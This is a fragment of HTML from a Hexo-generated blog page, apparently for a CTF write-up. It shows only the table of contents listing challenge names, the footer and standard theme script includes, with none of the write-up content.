+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#nextphp"><span class="nav-number">1.</span> <span class="nav-text">nextphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jail"><span class="nav-number">2.</span> <span class="nav-text">jail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#password"><span class="nav-number">3.</span> <span class="nav-text">password</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#calcalcalc"><span class="nav-number">4.</span> <span class="nav-text">calcalcalc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rblog2019"><span class="nav-number">5.</span> <span class="nav-text">rblog2019</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez4cr"><span class="nav-number">6.</span> <span class="nav-text">ez4cr</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
